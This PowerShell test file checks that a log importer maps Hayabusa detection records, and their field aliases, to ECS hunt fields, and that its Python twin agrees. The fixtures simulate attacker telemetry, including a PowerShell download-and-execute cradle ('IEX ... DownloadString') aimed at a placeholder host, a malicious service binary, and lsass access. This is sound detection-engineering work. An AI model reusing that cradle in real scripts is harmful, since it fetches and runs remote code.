# tests/EcsHuntFields.Tests.ps1
#
# The fields the hunt dashboard pivots on, promoted to their ECS names
# (2026-10-14). They were already in the index, but only under Windows' own
# names inside hayabusa.details / hayabusa.extra - and under Hayabusa's short
# aliases when a rule renames them (7045: Svc, Path) - so a panel had to know
# every spelling. Both importers must produce the same documents, so the
# second half runs the Python twin on the same records and compares.
. "$PSScriptRoot\..\code\HayabusaLib.ps1"

$fixtures = @(
    @{ Computer='DC01'; Timestamp='2026-10-14T10:00:00Z'; Level='low'; RuleTitle='Logon'; EventID=4624; Channel='Security'
       Details=@{ TargetUserName='jsmith'; LogonType='10 - REMOTE_INTERACTIVE'; IpAddress='10.0.0.9' } }
    @{ Computer='DC01'; Timestamp='2026-10-14T10:00:01Z'; Level='low'; RuleTitle='Logon'; EventID=4624; Channel='Security'
       Details=@{ TargetUserName='svc'; LogonType='3 - NETWORK' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:02Z'; Level='medium'; RuleTitle='New Svc'; EventID=7045; Channel='System'
       Details=@{ Svc='evilsvc'; Path='C:\Windows\Temp\evil.exe'; Acct='LocalSystem' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:03Z'; Level='info'; RuleTitle='PwSh Scriptblock'; EventID=4104; Channel='Microsoft-Windows-PowerShell/Operational'
       Details=@{ ScriptBlockText='IEX (New-Object Net.WebClient).DownloadString("http://x")' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:04Z'; Level='high'; RuleTitle='Run Key'; EventID=13; Channel='Microsoft-Windows-Sysmon/Operational'
       Details=@{ TgtObj='HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\updater'; Proc='C:\x\a.exe' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:05Z'; Level='info'; RuleTitle='DNS Query'; EventID=22; Channel='Microsoft-Windows-Sysmon/Operational'
       Details=@{ Query='bad.example.com'; Proc='C:\x\a.exe' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:06Z'; Level='info'; RuleTitle='Proc Exec'; EventID=1; Channel='Microsoft-Windows-Sysmon/Operational'
       Details=@{ Proc='C:\Windows\System32\cmd.exe'; Cmdline='cmd /c whoami'; ParentCmdline='"WINWORD.EXE" /n doc.docm'; ParentProc='C:\Office\WINWORD.EXE'; Hashes='SHA256=AABB,MD5=CCDD' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:07Z'; Level='info'; RuleTitle='File Created'; EventID=11; Channel='Microsoft-Windows-Sysmon/Operational'
       Details=@{ Proc='C:\x\a.exe' }; ExtraFieldInfo=@{ TargetFilename='C:\Users\Public\drop.ps1' } }
    @{ Computer='DC01'; Timestamp='2026-10-14T10:00:08Z'; Level='info'; RuleTitle='Kerberos TGS'; EventID=4769; Channel='Security'
       Details=@{ TargetUserName='jsmith' }; ExtraFieldInfo=@{ ServiceName='MSSQLSvc'; LogonType='99' } }
    # Hayabusa's own default-details aliases (rules/config/default_details.txt)
    @{ Computer='DC01'; Timestamp='2026-10-14T10:00:09Z'; Level='low'; RuleTitle='Failed Logon'; EventID=4625; Channel='Security'
       Details=@{ Type='3 - NETWORK'; TgtUser='admin'; AuthPkg='NTLM' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:10Z'; Level='info'; RuleTitle='Reg Value Set'; EventID=13; Channel='Microsoft-Windows-Sysmon/Operational'
       Details=@{ RegKey='HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\x'; Proc='C:\x\a.exe' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:11Z'; Level='info'; RuleTitle='Reg Renamed'; EventID=14; Channel='Microsoft-Windows-Sysmon/Operational'
       Details=@{ OldName='HKLM\SOFTWARE\Old'; NewName='HKLM\SOFTWARE\New' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:12Z'; Level='medium'; RuleTitle='WMI Filter'; EventID=19; Channel='Microsoft-Windows-Sysmon/Operational'
       Details=@{ Query='SELECT * FROM __InstanceModificationEvent WITHIN 60'; Name='evil' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:13Z'; Level='medium'; RuleTitle='WMI Consumer'; EventID=20; Channel='Microsoft-Windows-Sysmon/Operational'
       Details=@{ Type='Command Line'; Name='evil' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:14Z'; Level='medium'; RuleTitle='Svc Installed'; EventID=7045; Channel='System'
       Details=@{ Svc='agent' }; ExtraFieldInfo=@{ ImagePath='"C:\Program Files\Agent\svc.exe" -k netsvcs' } }
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:15Z'; Level='medium'; RuleTitle='Svc Installed'; EventID=4697; Channel='Security'
       Details=@{ ServiceName='lsvc' }; ExtraFieldInfo=@{ ServiceFileName='%SystemRoot%\system32\svchost.exe -k LocalService' } }
    # Sysmon 10 (default_details): SrcUser opened a process owned by TgtUser.
    @{ Computer='WS01'; Timestamp='2026-10-14T10:00:16Z'; Level='high'; RuleTitle='Proc Access (Sysmon Alert)'; EventID=10; Channel='Microsoft-Windows-Sysmon/Operational'
       Details=@{ SrcProc='C:\x\a.exe'; SrcUser='CORP\eve'; TgtProc='C:\Windows\System32\lsass.exe'; TgtUser='NT AUTHORITY\SYSTEM' } }
)
$docs = @($fixtures | ForEach-Object { $_ | ConvertTo-Json -Depth 6 | ConvertFrom-Json })
$ecs  = @($docs | ForEach-Object { ConvertTo-EcsDocument $_ 'testid' })

Assert-Equal $ecs[0].winlog.logon.type 'RemoteInteractive' "LogonType 10 is RemoteInteractive, Winlogbeat's name for it"
Assert-Equal $ecs[1].winlog.logon.type 'Network' "LogonType 3 is Network"
Assert-Equal $ecs[0].winlog.channel 'Security' "the logon type joins winlog without displacing the channel"
Assert-Equal $ecs[2].service.name 'evilsvc' "7045's Svc alias becomes service.name"
Assert-Equal $ecs[2].file.path 'C:\Windows\Temp\evil.exe' "and its Path becomes file.path"
Assert-Equal $ecs[2].file.name 'evil.exe' "with file.name"
Assert-Equal $ecs[3].powershell.file.script_block_text 'IEX (New-Object Net.WebClient).DownloadString("http://x")' "4104's script block becomes powershell.file.script_block_text"
Assert-Equal $ecs[4].registry.path 'HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\updater' "Sysmon 13's TgtObj becomes registry.path"
Assert-Equal $ecs[5].dns.question.name 'bad.example.com' "Sysmon 22's Query becomes dns.question.name"
Assert-Equal $ecs[6].process.parent.command_line '"WINWORD.EXE" /n doc.docm' "the parent's command line is promoted"
Assert-Equal $ecs[6].file.hash.sha256 'AABB' "hashes still land in file.hash"
Assert-True ($null -eq $ecs[6].file.path) "a process event does not invent a file.path"
Assert-Equal $ecs[7].file.path 'C:\Users\Public\drop.ps1' "a field only in ExtraFieldInfo is found too"
Assert-Equal $ecs[8].service.name 'MSSQLSvc' "4769's ServiceName (from ExtraFieldInfo) becomes service.name"
Assert-Equal $ecs[8].winlog.logon.type '99' "an unknown logon type is kept as given, not dropped"
Assert-Equal $ecs[9].winlog.logon.type 'Network' "Hayabusa's 'Type' alias on a logon event is the logon type"
# The sample corpus run (2026-10-17): "Logon Failure (Unknown Reason)" writes
# only TgtUser, so these failed logons had no user.name and fell out of every
# "top users" panel.
Assert-Equal $ecs[9].user.name 'admin' "Hayabusa's 'TgtUser' alias becomes user.name when no full name is there"
Assert-Equal $ecs[0].user.name 'jsmith' "a full TargetUserName still wins"
Assert-Equal $ecs[-1].user.name 'CORP\eve' "on Sysmon 10 the user is the account doing the access, not the target process's owner"
Assert-Equal $ecs[10].registry.path 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\x' "Sysmon 13's default 'RegKey' alias becomes registry.path"
Assert-Equal $ecs[11].registry.path 'HKLM\SOFTWARE\Old' "Sysmon 14's 'OldName' is the key that was renamed"
Assert-True ($null -eq $ecs[12].dns) "a WMI 'Query' (Sysmon 19) is not a DNS name"
Assert-True ($null -eq $ecs[13].winlog.logon) "a WMI consumer 'Type' (Sysmon 20) is not a logon type"
Assert-Equal $ecs[14].file.path 'C:\Program Files\Agent\svc.exe' "a quoted service command line is cut to its binary"
Assert-Equal $ecs[14].file.name 'svc.exe' "so the binary's name is clean"
Assert-Equal $ecs[15].file.path '%SystemRoot%\system32\svchost.exe' "an unquoted one is cut after the executable"
Assert-Equal $ecs[5].dns.question.name 'bad.example.com' "Sysmon 22's 'Query' is still a DNS name"

# ---- every promoted field is mapped, so it is searchable ----
$tmpl = Get-Content "$PSScriptRoot\..\code\index-template.json" -Raw | ConvertFrom-Json
$p = $tmpl.template.mappings.properties
Assert-Equal $p.winlog.properties.logon.properties.type.type 'keyword' "winlog.logon.type is mapped"
Assert-Equal $p.service.properties.name.type 'keyword' "service.name is mapped"
Assert-Equal $p.file.properties.path.type 'keyword' "file.path is mapped"
Assert-Equal $p.file.properties.name.type 'keyword' "file.name is mapped"
Assert-Equal $p.registry.properties.path.type 'keyword' "registry.path is mapped"
Assert-Equal $p.dns.properties.question.properties.name.type 'keyword' "dns.question.name is mapped"
Assert-Equal $p.process.properties.parent.properties.command_line.type 'keyword' "process.parent.command_line is mapped"
# A script block runs to tens of kilobytes; a keyword over 32 KB is refused
# by Elasticsearch and takes the whole document with it.
Assert-Equal $p.powershell.properties.file.properties.script_block_text.type 'text' "the script block is text, never a keyword"

# ---- the Python importer agrees ----
$py = Get-Command python -ErrorAction SilentlyContinue
if (-not $py) { Write-Host "  [SKIP] python not found - twin comparison skipped" -ForegroundColor Yellow; return }
$tmp = Join-Path ([IO.Path]::GetTempPath()) ("twins-{0}" -f [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
try {
    $in  = Join-Path $tmp 'in.jsonl'
    $out = Join-Path $tmp 'out.jsonl'
    [IO.File]::WriteAllLines($in, [string[]]@($fixtures | ForEach-Object { $_ | ConvertTo-Json -Depth 6 -Compress }))
    # The script reports on stderr. Under the runner's ErrorAction Stop, PS 5.1
    # turns any native stderr line into a terminating error, so it is relaxed
    # for this one call.
    & { $ErrorActionPreference = 'Continue'; & $py.Source -I "$PSScriptRoot\..\scripts\hayabusa_to_ecs.py" $in -o $out --import-id testid 2>$null }
    $pyDocs = @(Get-Content -LiteralPath $out -Encoding UTF8 | ForEach-Object { $_ | ConvertFrom-Json })
    Assert-Equal $pyDocs.Count $ecs.Count "the Python importer converted every record"
    $paths = 'event.id','winlog.logon.type','service.name','file.path','file.name','powershell.file.script_block_text',
             'registry.path','dns.question.name','process.parent.command_line','file.hash.sha256','user.name','related.user'
    for ($i = 0; $i -lt $ecs.Count; $i++) {
        foreach ($path in $paths) {
            $a = $ecs[$i]; $b = $pyDocs[$i]
            foreach ($seg in $path.Split('.')) { $a = if ($null -ne $a) { $a.$seg }; $b = if ($null -ne $b) { $b.$seg } }
            if ("$a" -cne "$b") { Assert-Equal "$b" "$a" "record $i ${path}: Python matches PowerShell" }
        }
    }
    Assert-True $true "the Python importer promotes the same hunt fields as the PowerShell one"
}
finally { Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue }
